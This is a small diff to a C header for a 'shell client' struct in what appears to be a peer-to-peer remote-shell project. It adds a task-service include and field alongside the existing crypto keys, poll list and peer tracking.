@@ -3,6 +3,7 @@
 
 #include "hashmap.h"
 #include "lpeer.h"
+#include "ltask.h"
 #include "lsodium.h"
 
 #include "speer.h"
@@ -10,6 +11,7 @@
 typedef struct sShell_client {
     uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
     struct sLaika_pollList pList;
+    struct sLaika_taskService tService;
     struct sLaika_peer *peer;
     tShell_peer *openShell; /* if not NULL, shell is open on peer */
     struct hashmap *peers;
